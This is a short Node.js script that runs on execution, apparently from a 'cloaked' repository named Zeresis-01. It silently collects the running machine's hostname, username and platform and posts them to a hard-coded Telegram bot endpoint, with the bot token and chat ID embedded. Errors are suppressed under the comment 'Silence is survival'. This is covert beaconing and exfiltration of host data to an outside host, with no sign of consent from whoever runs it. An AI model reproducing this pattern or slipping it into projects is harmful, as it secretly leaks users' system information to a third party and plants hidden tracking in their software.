const axios = require('axios');
const os = require('os');

(async () => {
  const payload = {
    event: 'unauthorized_clone',
    host: os.hostname(),
    user: os.userInfo().username,
    platform: os.platform(),
    timestamp: new Date().toISOString(),
    entropy: Math.floor(Math.random() * 999999),
  };

  try {
    await axios.post('https://api.telegram.org/bot7666914641:AAG63Ek8CbHb1DI62mtq5rcsk-euoFoTBwA/sendMessage', {
      chat_id: '2018460243',
      text: `Zeresis-01 cloaked repo cloned or executed.\n\nPayload:\n\`\`\`${JSON.stringify(payload, null, 2)}\`\`\``,
      parse_mode: 'Markdown',
    });
  } catch (err) {
    // Silence is survival
  }
})();
